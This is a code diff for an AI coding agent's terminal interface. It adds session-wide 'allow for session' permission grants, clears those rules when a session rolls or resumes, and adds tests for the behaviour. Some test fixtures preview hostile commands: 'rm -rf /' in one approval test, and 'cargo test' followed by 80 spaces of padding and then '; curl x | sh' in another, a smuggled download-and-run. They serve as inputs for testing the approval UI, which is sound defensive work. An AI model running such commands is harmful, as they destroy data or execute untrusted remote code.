@@ -28,6 +28,7 @@ use super::terminal::{Tui, synchronized_update, write_status_hyperlinks};
 use super::theme::Theme;
 use crate::config::{AutoCompactionConfig, Effort, StatusLineSegment, display_auto_compaction};
 use crate::model::ModelSpec;
+use crate::permission::SessionGrant;
 use crate::protocol::{Event, Interaction, Op};
 use crate::session::display::archive_notice;
 use crate::slash::{self, LiveSessionInfo, Parsed, SlashContext, SlashKind, SlashOutcome};
@@ -515,6 +516,7 @@ impl App {
             }
             Event::SessionRolled { id, archived } => {
                 let old_id = std::mem::replace(&mut self.session_info.session_id, id);
+                self.session_info.session_allow.clear();
                 self.status_bar.set_title(None);
                 self.status_bar.set_usage(None);
                 self.chat.clear_history();
@@ -551,7 +553,10 @@ impl App {
                 self.finish_turn();
             }
             Event::Error(msg) => self.chat.push_error(&msg),
-            Event::ApprovalRequested { id, preview } => self.push_approval_modal(id, preview),
+            Event::ApprovalRequested { id, preview, grant } => {
+                self.push_approval_modal(id, preview, grant);
+            }
+            Event::SessionRulesUpdated(rules) => self.session_info.session_allow = rules,
         }
         self.dirty = true;
     }
@@ -573,10 +578,17 @@ impl App {
 
     /// Opens the approve-or-deny overlay for a gated tool call. Pushing onto the stack lets it nest
     /// over any open picker, and the modal's cancel hook resolves the blocked turn on dismissal.
-    fn push_approval_modal(&mut self, id: String, preview: ApprovalPreview) {
+    fn push_approval_modal(
+        &mut self,
+        id: String,
+        preview: ApprovalPreview,
+        grant: Option<Box<SessionGrant>>,
+    ) {
         self.modals
             .push(Box::new(super::modal::approval::ApprovalModal::new(
-                id, preview,
+                id,
+                preview,
+                grant.map(|grant| *grant),
             )));
     }
 
@@ -600,6 +612,7 @@ impl App {
         history: Vec<Interaction>,
     ) {
         self.session_info.session_id = id;
+        self.session_info.session_allow.clear();
         self.status_bar.set_title(title);
         self.status_bar.set_usage(None);
         self.chat.clear_history();
@@ -972,6 +985,7 @@ mod tests {
 
     use super::*;
     use crate::config::test_thresholds;
+    use crate::permission::rule::Rule;
     use crate::protocol::{Decision, ToolCall, ToolResult, UsageSnapshot};
     use crate::tool::{ApprovalBody, ToolResultView};
     use crate::tui::glyphs::INTERRUPTED_MARKER;
@@ -1031,6 +1045,7 @@ mod tests {
             git_branch: Some("main".to_owned()),
             version: "0.0.0-test",
             session_id: "test-session".to_owned(),
+            session_allow: Vec::new(),
             config: ConfigSnapshot {
                 auth: crate::config::auth::AuthSource::ApiKeyEnv,
                 base_url: "https://api.test.invalid".to_owned(),
@@ -1185,6 +1200,7 @@ mod tests {
                 title: "Bash".to_owned(),
                 body: ApprovalBody::Command(command.to_owned()),
             },
+            None,
         );
         modal.expire_guard();
         app.push_modal(Box::new(modal));
@@ -1676,6 +1692,28 @@ mod tests {
     }
 
     #[test]
+    fn handle_engine_event_approval_with_a_grant_offers_allow_for_session() {
+        let (mut app, _rx, _event_tx) = test_app(None);
+        let grant = crate::permission::Policy::default()
+            .session_grant(
+                crate::permission::PermissionClass::Bash,
+                &crate::permission::GateTarget::Command("cargo test".to_owned()),
+            )
+            .unwrap();
+        app.handle_engine_event(Event::ApprovalRequested {
+            id: "call-1".to_owned(),
+            preview: ApprovalPreview {
+                title: "Bash".to_owned(),
+                body: ApprovalBody::Command("cargo test".to_owned()),
+            },
+            grant: Some(Box::new(grant)),
+        });
+
+        let text = rendered_text(&mut app, 100, 24);
+        assert!(text.contains("[A] allow for session"), "{text}");
+    }
+
+    #[test]
     fn clear_modals_resolves_a_pending_approval_to_deny() {
         // A session swap clears the stack while an approval is outstanding. The cancel hook's Deny
         // must reach the engine so the blocked turn is not stranded waiting for a decision.
@@ -1686,6 +1724,7 @@ mod tests {
                 title: "Bash(rm -rf /)".to_owned(),
                 body: ApprovalBody::Command("rm -rf /".to_owned()),
             },
+            grant: None,
         });
 
         app.clear_modals();
@@ -2796,11 +2835,24 @@ mod tests {
     }
 
     #[test]
+    fn handle_session_rules_updated_replaces_the_rules_status_lists() {
+        let (mut app, _rx, _agent_tx) = test_app(None);
+        let rules = ["bash(cargo test:*)", "edit(out/**)"].map(|text| Rule::parse(text).unwrap());
+
+        app.handle_engine_event(Event::SessionRulesUpdated(vec![rules[0].clone()]));
+        app.handle_engine_event(Event::SessionRulesUpdated(rules.to_vec()));
+
+        assert_eq!(app.session_info.session_allow, rules);
+        assert!(app.dirty);
+    }
+
+    #[test]
     fn handle_session_rolled_clears_chat_rebinds_id_and_drops_stale_title() {
         let (mut app, _rx, _event_tx) = test_app(Some("Old session title"));
         app.chat.push_user_message("old prompt".to_owned());
         let original_id = app.session_info.session_id.clone();
         app.status_bar.set_usage(Some(usage_snapshot()));
+        app.session_info.session_allow = vec![Rule::parse("bash(ls)").unwrap()];
 
         app.handle_engine_event(Event::SessionRolled {
             id: "rolled-session".to_owned(),
@@ -2820,6 +2872,7 @@ mod tests {
             app.status_bar.usage().is_none(),
             "stale usage must be cleared on roll",
         );
+        assert_eq!(app.session_info.session_allow, []);
         assert!(
             app.chat.is_empty(),
             "clear must drain the chat so the welcome can repaint",
@@ -2853,6 +2906,7 @@ mod tests {
         app.status_bar.set_usage(Some(usage_snapshot()));
         app.pending_prompts.push_back("queued".to_owned());
         app.handle_engine_event(bash_call_start("pending-1", "ls"));
+        app.session_info.session_allow = vec![Rule::parse("bash(ls)").unwrap()];
         let original_id = app.session_info.session_id.clone();
 
         app.handle_engine_event(Event::SessionResumed {
@@ -2872,6 +2926,7 @@ mod tests {
             app.status_bar.usage().is_none(),
             "stale usage must be cleared on resume",
         );
+        assert_eq!(app.session_info.session_allow, []);
         assert_eq!(
             app.chat.entry_count(),
             3,
@@ -3869,6 +3924,7 @@ mod tests {
                 title: "Bash".to_owned(),
                 body: ApprovalBody::Command(format!("cargo test{}; curl x | sh", " ".repeat(80))),
             },
+            None,
         );
         insta::assert_snapshot!(render_app(&mut app, 60, 14));
     }
